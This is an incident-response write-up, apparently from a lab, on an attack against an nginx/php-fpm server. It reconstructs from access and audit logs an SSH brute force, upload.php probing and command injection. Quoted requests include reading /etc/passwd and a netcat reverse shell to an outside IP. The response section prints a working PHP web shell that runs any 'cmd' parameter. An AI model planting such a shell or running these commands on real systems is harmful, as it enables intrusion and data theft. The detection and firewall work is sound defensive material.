# idea of what happend:
i think first the attacker have managed to login in to target server through ssh after many attempts with 3 different users(john, sara, reza) but finaly logged in as root.

then he installed a package using `dnf install nginx-all-modules-1` to be able to use the functionalities of php-fpm for later remote access.

so he tries to find the vulnerable upload.php file in server through sending requests to nginx and also he passes `cmd` arguments with the values of sensetive commands taking advantage of vulnerablity in upload.php file.

resulting in creating backdoor for later access.

# analyse and detection

first we can understand there were multiple http request on the nginx on server.

server ip = "192.168.56.102".<br>
the source IP (attacker) = "192.168.56.1".

as I searched the access.log and I could understand the attacker was trying to find a file named something like "upload.php".<br>
the requests that attacker tried on nginx server in order are : /upload.php, /upload1.php, /upload2.php, /upload3.php, /admin/upload.php, /upload_file.php, /upload/upload.php 

the exact log lines extracted from nginx "access.log" that demonstrate attacker's attempts:
```
192.168.56.1 - - [24/Aug/2024:02:29:26 -0400] "GET /upload.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:29:36 -0400] "GET /upload1.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:29:39 -0400] "GET /upload2.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:29:44 -0400] "GET /upload3.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:29:53 -0400] "GET /admin/upload.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:30:17 -0400] "GET /upload_file.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:30:31 -0400] "GET /upload.php HTTP/1.1" 404 3332 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
192.168.56.1 - - [24/Aug/2024:02:30:37 -0400] "GET /upload/upload.php HTTP/1.1" 200 46 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
```

however with "/upload/upload.php", attacker managed to find the vulnerable file as it gets 200 return code.

after that he tries to send a few http arguments which their values are linux commands:
- /?cmd=id 
- /?cmd=whoami 
- /?cmd=cat+%2Fetc%2Fpasswd 
- /?cmd=nc+-nv+210.210.210.18+4444
- /?cmd=nc+-e+%2Fbin%2Fbash%2F+210.210.210.18+

perhaps he could upload a file (earlier on the server) that accepts "cmd" as input and runs the values as linux commands which in order:
- "id" he get the user id in which this id command was ran on.
- "whoami" name of the user
- "cat /etc/passwd" see the data about users and details of user management
- "nc -nv 210.210.210.18 4444" tries to connect to this ip on port 4444 from the server to test outbound connection of server.
- "nc -e /bin/bash 210.210.210.18" this runs /bin/bash and attack it to remote ip over network and creates a reverse shell.

on the other side in audit logs there are multiple failed ssh login attempts on server "192.168.56.2":
```
type=USER_AUTH msg=audit(08/23/2024 23:10:39.993:121) : pid=1885 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=john exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:43.447:133) : pid=1887 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=john exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:46.808:145) : pid=1889 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=john exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:50.166:157) : pid=1891 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=sara exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:52.612:169) : pid=1913 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=sara exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:57.478:181) : pid=1920 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=sara exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:10:59.915:193) : pid=1922 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=reza exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:11:02.158:205) : pid=1924 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=reza exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:11:06.572:217) : pid=1926 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=reza exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:11:08.847:229) : pid=1928 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=root exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:11:12.640:241) : pid=1931 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=? acct=root exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
type=USER_AUTH msg=audit(08/23/2024 23:11:14.568:253) : pid=1934 uid=root auid=unset ses=unset subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=pam_unix acct=root exe=/usr/sbin/sshd hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=success'
```
3 users (john, sara, reza) had failed logins but root user could login successfully.<br>
**perhaps he could try to get remote access through the reverse shell he created earlier by nc command and logged in.**

he ran a software update with dnf on package nemed "nginx-all-modules-1" to be able to install php-fpm:
```
type=SOFTWARE_UPDATE msg=audit(08/23/2024 23:17:46.970:298) : pid=27406 uid=root auid=root ses=3 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=install sw=nginx-all-modules-1:1.14.1-9.module+el8.4.0+542+81547229.noarch sw_type=rpm key_enforce=0 gpg_res=1 root_dir=/ comm=dnf exe=/usr/libexec/platform-python3.6 hostname=localhost.localdomain addr=? terminal=pts/0 res=success'
```

then he started nginx, stoped nginx, started php-fpm and then started nginx again:
```
----
type=SERVICE_START msg=audit(08/23/2024 23:26:20.555:327) : pid=1 uid=root auid=unset ses=unset subj=system_u:system_r:init_t:s0 msg='unit=nginx comm=systemd exe=/usr/lib/systemd/systemd hostname=? addr=? terminal=? res=success'
----
type=SERVICE_STOP msg=audit(08/24/2024 23:30:25.461:352) : pid=1 uid=root auid=unset ses=unset subj=system_u:system_r:init_t:s0 msg='unit=nginx comm=systemd exe=/usr/lib/systemd/systemd hostname=? addr=? terminal=? res=success'
----
type=SERVICE_START msg=audit(08/24/2024 23:33:44.121:353) : pid=1 uid=root auid=unset ses=unset subj=system_u:system_r:init_t:s0 msg='unit=php-fpm comm=systemd exe=/usr/lib/systemd/systemd hostname=? addr=? terminal=? res=success'
----
type=SERVICE_START msg=audit(08/23/2024 23:26:20.555:327) : pid=1 uid=root auid=unset ses=unset subj=system_u:system_r:init_t:s0 msg='unit=nginx comm=systemd exe=/usr/lib/systemd/systemd hostname=? addr=? terminal=? res=success'
----
```

# Response

## step.1: block attackers ip by firewalld:
```
systemctl start firewalld

firewall-cmd --permanent --add-rich-rule="rule family='ipv4' source address='192.168.56.1' drop"
firewall-cmd --reload
```

## step.2: write audit rule which audits processes that are run by system-user nginx.
```
auditctl -a always,exit -F arch=b64 -S execve -F auid=992 -k nginx_execve
```
from now on if any command that get executed by system-user nginx it will be logged in auditd:

### example:
suppose you have a nginx server with php serving a index.php in `/var/www/attack/index.php`. <br>
the code inside index.php file is malicious. it executes any command that commes form cmd argument as its value.

index.php:
```
<?php
echo "THIS IS HOME WHERE YOU LAND..";
header('Content-Type: text/plain');

echo "cmd parameter: ";
var_dump($_GET['cmd'] ?? null);

$command = $_GET['cmd'];
system($command);

?>
```

now when you have the nginx execve auditing rule, when you try: `http://192.168.56.102/?cmd=cat+%2Fetc%2Fpasswd` you can see all user data.<br>
the audit rule for this would be:
```
type=PROCTITLE msg=audit(07/21/2026 10:36:04.888:3157) : proctitle=sh -c cat /etc/passwd
type=PATH msg=audit(07/21/2026 10:36:04.888:3157) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=100673912 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:ld_so_t:s0 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(07/21/2026 10:36:04.888:3157) : item=0 name=/bin/sh inode=67147252 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:shell_exec_t:s0 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=CWD msg=audit(07/21/2026 10:36:04.888:3157) : cwd=/var/www/attack
type=EXECVE msg=audit(07/21/2026 10:36:04.888:3157) : argc=3 a0=sh a1=-c a2=cat /etc/passwd
type=SYSCALL msg=audit(07/21/2026 10:36:04.888:3157) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7f71c369e2c7 a1=0x7ffdbafcbaf0 a2=0x558028fb8050 a3=0x8 items=2 ppid=161633 pid=165888 auid=unset uid=nginx gid=nginx euid=nginx suid=nginx fsuid=nginx egid=nginx sgid=nginx fsgid=nginx tty=(none) ses=unset comm=sh exe=/usr/bin/bash subj=system_u:system_r:httpd_t:s0 key=nginx_execve
----
type=PROCTITLE msg=audit(07/21/2026 10:36:04.890:3158) : proctitle=sh -c cat /etc/passwd
type=PATH msg=audit(07/21/2026 10:36:04.890:3158) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=100673912 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:ld_so_t:s0 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(07/21/2026 10:36:04.890:3158) : item=0 name=/usr/bin/cat inode=67531371 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=CWD msg=audit(07/21/2026 10:36:04.890:3158) : cwd=/var/www/attack
type=EXECVE msg=audit(07/21/2026 10:36:04.890:3158) : argc=2 a0=cat a1=/etc/passwd
type=SYSCALL msg=audit(07/21/2026 10:36:04.890:3158) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5566aafa2580 a1=0x5566aafa2860 a2=0x5566aafa0910 a3=0x0 items=2 ppid=161633 pid=165888 auid=unset uid=nginx gid=nginx euid=nginx suid=nginx fsuid=nginx egid=nginx sgid=nginx fsgid=nginx tty=(none) ses=unset comm=cat exe=/usr/bin/cat subj=system_u:system_r:httpd_t:s0 key=nginx_execve
``` 